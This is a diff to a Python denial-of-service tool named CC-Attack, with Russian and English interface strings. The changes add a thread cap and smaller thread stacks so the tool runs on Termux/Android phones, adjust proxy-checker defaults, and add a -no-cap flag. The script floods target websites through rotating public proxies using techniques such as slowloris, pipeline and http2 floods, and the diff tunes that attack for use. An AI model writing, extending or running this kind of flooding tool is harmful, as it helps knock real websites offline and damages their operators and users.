@@ -1,9 +1,9 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 """
-CC-Attack v3.9.9 — refactored + i18n (RU/EN) + fast proxy checker
-                    + RPS boost + multi-method/technique + interactive menu
-                    + updated 2026 proxy sources
+CC-Attack v3.10.0 — refactored + i18n (RU/EN) + fast proxy checker
+                     + RPS boost + multi-method/technique + interactive menu
+                     + updated 2026 proxy sources + Termux/Android safe threads
 Author: DIDO
 Requires: pip install requests pysocks
 """
@@ -43,7 +43,7 @@ class C:
     PRP   = "\033[95m"
     WHT   = "\033[97m"
 
-VERSION = "3.9.9"
+VERSION = "3.10.0"
 BUILD   = "2026/09/25"
 
 # ── Параметры RPS-буста ─────────────────────────────────────────────────────
@@ -55,6 +55,16 @@ CONNECT_TIMEOUT       = 2.5
 SEND_TIMEOUT          = 2.0
 ERROR_BACKOFF         = 0.002
 SLOW_DELAY_DEFAULT    = 0.5
+
+# ── Termux / Android: безопасный лимит потоков ──────────────────────────────
+try:
+    _CPU = os.cpu_count() or 4
+except Exception:
+    _CPU = 4
+# 4 × CPU + 100 — эвристика для мобилок. На ПК-сервере можно поднять через -t.
+AUTO_THREAD_CAP = max(120, min(1500, 4 * _CPU + 100))
+# Стек потока: 256 KB вместо 8 MB → ×32 экономия RAM
+THREAD_STACK_SIZE = 256 * 1024
 
 # ── Множества методов и техник ──────────────────────────────────────────────
 HTTP_METHODS = [
@@ -112,6 +122,10 @@ TEXTS = {
         "warn_shutdown":   "Завершение по Ctrl+C…",
         "warn_force":      "Повторный сигнал — жёсткий выход.",
         "warn_interrupt":  "Прервано пользователем.",
+        "warn_thread_cap": "Снижаю -t с {req} до {cap} (эвристика для {os}: {cpu} CPU).",
+        "warn_thread_fail":"ОС не даёт больше потоков (создано {got} из {req}): {err}",
+        "warn_thread_cont":"Продолжаю с {got} потоками. Для Termux: -t 150..300.",
+        "err_no_threads":  "Не удалось создать ни одного потока. Уменьшите -t.",
         "ok_done":         "Готово. Отправлено: {sent}, ошибок: {err}, трафик: {mb:.2f} МБ, средний RPS: {rps:.0f}",
         "progress":        "  {grn}▶{rst} {el:>3}/{tot}s  | {cyn}отправлено:{rst} {sent:<9} | {red}ошибок:{rst} {err:<7} | {yel}МБ:{rst} {mb:>6.2f} | {prp}RPS:{rst} {rps:>7.0f}",
         "help_title":      "справка",
@@ -120,7 +134,7 @@ TEXTS = {
         "help_method":     "HTTP-метод: GET/POST/HEAD/PUT/DELETE/PATCH/OPTIONS/TRACE/CONNECT/RANDOM",
         "help_technique":  "техника: flood/slow/pipeline/mixed/random/slowloris/gzip/chunked/range/http2",
         "help_proxy":      "тип прокси (по умолчанию 5)",
-        "help_threads":    "потоков (по умолчанию 800)",
+        "help_threads":    "потоков (по умолчанию 800, авто-кап на Termux)",
         "help_period":     "длительность атаки (60)",
         "help_brute":      "TCP_NODELAY brute (0)",
         "help_file":       "файл прокси (proxy.txt)",
@@ -131,7 +145,7 @@ TEXTS = {
         "help_down":       "скачать прокси",
         "help_check":      "проверить прокси (быстрая проверка)",
         "help_check_to":   "таймаут проверки прокси в секундах (3)",
-        "help_check_w":    "воркеров проверки прокси (500)",
+        "help_check_w":    "воркеров проверки прокси (200)",
         "help_pipeline":   "глубина pipeline 1..64 (8)",
         "help_keepalive":  "запросов на сокет 1..10000 (500)",
         "help_log":        "дублировать вывод в файл",
@@ -233,6 +247,10 @@ TEXTS = {
         "warn_shutdown":   "Shutdown by Ctrl+C…",
         "warn_force":      "Second signal — hard exit.",
         "warn_interrupt":  "Interrupted by user.",
+        "warn_thread_cap": "Lowering -t from {req} to {cap} (heuristic for {os}: {cpu} CPU).",
+        "warn_thread_fail":"OS cannot create more threads (started {got} of {req}): {err}",
+        "warn_thread_cont":"Continuing with {got} threads. For Termux: -t 150..300.",
+        "err_no_threads":  "Could not start any thread. Reduce -t.",
         "ok_done":         "Done. Sent: {sent}, errors: {err}, traffic: {mb:.2f} MB, avg RPS: {rps:.0f}",
         "progress":        "  {grn}▶{rst} {el:>3}/{tot}s  | {cyn}sent:{rst} {sent:<9} | {red}errs:{rst} {err:<7} | {yel}MB:{rst} {mb:>6.2f} | {prp}RPS:{rst} {rps:>7.0f}",
         "help_title":      "help",
@@ -241,7 +259,7 @@ TEXTS = {
         "help_method":     "HTTP method: GET/POST/HEAD/PUT/DELETE/PATCH/OPTIONS/TRACE/CONNECT/RANDOM",
         "help_technique":  "technique: flood/slow/pipeline/mixed/random/slowloris/gzip/chunked/range/http2",
         "help_proxy":      "proxy type (default 5)",
-        "help_threads":    "threads (default 800)",
+        "help_threads":    "threads (default 800, auto-cap on Termux)",
         "help_period":     "attack duration in seconds (60)",
         "help_brute":      "TCP_NODELAY brute (0)",
         "help_file":       "proxy file (proxy.txt)",
@@ -252,7 +270,7 @@ TEXTS = {
         "help_down":       "download proxies",
         "help_check":      "check proxies (fast mode)",
         "help_check_to":   "checker timeout in seconds (3)",
-        "help_check_w":    "checker workers (500)",
+        "help_check_w":    "checker workers (200)",
         "help_pipeline":   "pipeline depth 1..64 (8)",
         "help_keepalive":  "requests per socket 1..10000 (500)",
         "help_log":        "duplicate output to file",
@@ -438,61 +456,34 @@ def print_banner() -> None:
 #  🆕 ИСТОЧНИКИ ПРОКСИ (ОБНОВЛЕНО 2026)
 # ─────────────────────────────────────────────────────────────────────────────
 BUILTIN_PROXY_SOURCES = {
-    # ── SOCKS4 ──────────────────────────────────────────────────────────────
     "socks4": [
-        # Proxifly — обновление каждые 5 минут
         "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt",
-        # ProxyScrape — обновление каждые 5 минут
         "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks4/data.txt",
-        # TheSpeedX — ежедневно
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
-        # proxmint — каждые 30 минут
         "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/socks4.txt",
-        # iplocate — каждые 30 минут
         "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/socks4.txt",
-        # Free Proxy DB — ежедневно
         "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/socks4.txt",
-        # dinoz0rg — проверенные
         "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/socks4.txt",
-        # theriturajps — ежечасно
         "https://raw.githubusercontent.com/theriturajps/proxy-list/main/socks4.txt",
     ],
-    # ── SOCKS5 ──────────────────────────────────────────────────────────────
     "socks5": [
-        # Proxifly — обновление каждые 5 минут
         "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
-        # ProxyScrape — обновление каждые 5 минут
         "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks5/data.txt",
-        # TheSpeedX — ежедневно
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
-        # proxmint — каждые 30 минут
         "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/socks5.txt",
-        # iplocate — каждые 30 минут
         "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/socks5.txt",
-        # Free Proxy DB — ежедневно
         "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/socks5.txt",
-        # dinoz0rg — проверенные
         "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/socks5.txt",
-        # theriturajps — ежечасно
         "https://raw.githubusercontent.com/theriturajps/proxy-list/main/socks5.txt",
     ],
-    # ── HTTP / HTTPS ────────────────────────────────────────────────────────
     "http": [
-        # Proxifly — обновление каждые 5 минут
         "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
-        # ProxyScrape — обновление каждые 5 минут
         "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt",
-        # TheSpeedX — ежедневно
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-        # proxmint — каждые 30 минут
         "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/http.txt",
-        # iplocate — каждые 30 минут
         "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/http.txt",
-        # Free Proxy DB — ежедневно
         "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/http.txt",
-        # dinoz0rg — проверенные
         "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/http.txt",
-        # theriturajps — ежечасно
         "https://raw.githubusercontent.com/theriturajps/proxy-list/main/proxies.txt",
     ],
 }
@@ -1040,9 +1031,12 @@ def _check_one_fast(line: str, proxy_type: int, ms: int
 
 
 def check_proxies(proxies: list[str], proxy_type: int, ms: int = 3,
-                  workers: int = 500,
+                  workers: int = 200,
                   autosave_path: Path | None = None,
                   autosave_every: int = 5) -> list[str]:
+    # Безопасный кап для Termux
+    workers = max(10, min(workers, AUTO_THREAD_CAP))
+
     Log.info(t("info_checking", n=len(proxies), ms=ms, w=workers))
     alive: list[tuple[str, int]] = []
     done = 0
@@ -1234,7 +1228,7 @@ def menu_show(cfg: dict) -> None:
     down_val   = "YES" if cfg.get("down") else "NO"
     check_val  = "YES" if cfg.get("check") else "NO"
     to_val     = str(cfg.get("check_to", 3))
-    w_val      = str(cfg.get("check_w", 500))
+    w_val      = str(cfg.get("check_w", 200))
     lang_val   = cfg.get("lang", LANG).upper()
 
     print(_menu_line("1",  t("menu_1"),  url_val))
@@ -1329,7 +1323,7 @@ def menu_run(cfg: dict, base_args: argparse.Namespace) -> int:
         down=cfg.get("down", False),
         check=cfg.get("check", False),
         check_to=cfg.get("check_to", 3),
-        check_w=cfg.get("check_w", 500),
+        check_w=cfg.get("check_w", 200),
         pipeline=cfg.get("pipeline", PIPELINE_DEPTH),
         keepalive=cfg.get("keepalive", KEEPALIVE_PER_SOCKET),
         log_file=cfg.get("log_file"),
@@ -1522,7 +1516,7 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("-down", action="store_true")
     p.add_argument("-check", action="store_true")
     p.add_argument("-check-to", dest="check_to", type=int, default=3)
-    p.add_argument("-check-w", dest="check_w", type=int, default=500)
+    p.add_argument("-check-w", dest="check_w", type=int, default=200)
     p.add_argument("-pipeline", dest="pipeline", type=int,
                    default=PIPELINE_DEPTH)
     p.add_argument("-keepalive", dest="keepalive", type=int,
@@ -1532,6 +1526,8 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("-menu", action="store_true")
     p.add_argument("-profile", dest="profile")
     p.add_argument("-save-profile", dest="save_profile")
+    p.add_argument("-no-cap", dest="no_cap", action="store_true",
+                   help="disable auto thread cap (use real -t)")
     return p
 
 
@@ -1559,6 +1555,7 @@ def print_help() -> None:
   {C.CYN}-check{C.RESET}                     {L['help_check']}
   {C.CYN}-check-to{C.RESET}   <sec>          {L['help_check_to']}
   {C.CYN}-check-w{C.RESET}    <N>            {L['help_check_w']}
+  {C.CYN}-no-cap{C.RESET}                    disable auto thread cap
   {C.CYN}-log{C.RESET}        <file>         {L['help_log']}
   {C.CYN}-lang{C.RESET}       ru|en          {L['help_lang']}
   {C.CYN}-menu{C.RESET}                      {L['help_menu']}
@@ -1568,6 +1565,8 @@ def print_help() -> None:
 
 {C.BOLD}Техники:{C.RESET} {', '.join(TECHNIQUES)}
 {C.BOLD}Методы:{C.RESET}  {', '.join(HTTP_METHODS)}
+
+{C.DIM}Termux cap: {AUTO_THREAD_CAP} потоков (4×CPU+100). Stack: {THREAD_STACK_SIZE//1024} KB.{C.RESET}
 """)
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1604,6 +1603,24 @@ def run_attack(args: argparse.Namespace) -> int:
         port = int(port_s)
     else:
         target, port = hostport, (443 if protocol == "https" else 80)
+
+    # ── Авто-кап потоков (Termux-безопасность) ─────────────────────
+    requested = max(1, int(args.threads))
+    if getattr(args, "no_cap", False):
+        effective_threads = requested
+    else:
+        if requested > AUTO_THREAD_CAP:
+            Log.warn(t("warn_thread_cap",
+                       req=requested, cap=AUTO_THREAD_CAP,
+                       os=platform.system(), cpu=_CPU))
+        effective_threads = min(requested, AUTO_THREAD_CAP)
+
+    # ── Уменьшить стек потоков ─────────────────────────────────────
+    try:
+        if hasattr(threading, "stack_size"):
+            threading.stack_size(THREAD_STACK_SIZE)
+    except (ValueError, RuntimeError):
+        pass
 
     proxy_type = {"4": 4, "5": 5, "http": 0}[args.proxy_ver]
     out_file = Path(args.out_file)
@@ -1643,7 +1660,7 @@ def run_attack(args: argparse.Namespace) -> int:
     Log.info(t("info_target", url=f"{protocol}://{target}:{port}{path}"))
     Log.info(t("info_mode", mode=args.mode, method=args.method,
                tech=args.technique))
-    Log.info(t("info_perf", threads=args.threads,
+    Log.info(t("info_perf", threads=effective_threads,
                v=args.proxy_ver, p=args.pipeline))
 
     stop_event = threading.Event()
@@ -1658,7 +1675,7 @@ def run_attack(args: argparse.Namespace) -> int:
     signal.signal(signal.SIGINT, _shutdown)
     signal.signal(signal.SIGTERM, _shutdown)
 
-    pool_size = max(500, min(20000, 200 * args.threads))
+    pool_size = max(200, min(10000, 50 * effective_threads))
 
     handler = CCHandler(
         target=target, path=path, port=port, protocol=protocol,
@@ -1674,12 +1691,27 @@ def run_attack(args: argparse.Namespace) -> int:
         header_pool_size=pool_size,
     )
 
+    # ── Безопасный запуск потоков с try/except ─────────────────────
     Log.info(t("info_start"))
     threads = []
-    for _ in range(args.threads):
-        th = threading.Thread(target=handler.run, daemon=True)
-        th.start()
-        threads.append(th)
+    started = 0
+    for _ in range(effective_threads):
+        try:
+            th = threading.Thread(target=handler.run, daemon=True)
+            th.start()
+            threads.append(th)
+            started += 1
+        except RuntimeError as e:
+            Log.warn(t("warn_thread_fail",
+                       got=started, req=effective_threads, err=e))
+            break
+
+    if started == 0:
+        Log.err(t("err_no_threads"))
+        return 1
+
+    if started < effective_threads:
+        Log.warn(t("warn_thread_cont", got=started))
 
     start = time.time()
     try:
@@ -1700,6 +1732,9 @@ def run_attack(args: argparse.Namespace) -> int:
             sys.stdout.flush()
     finally:
         stop_event.set()
+        # Ждём остановки потоков (не дольше 3 сек)
+        for th in threads:
+            th.join(timeout=0.05)
         print()
         total_time = max(1e-6, time.time() - start)
         Log.ok(t("ok_done",
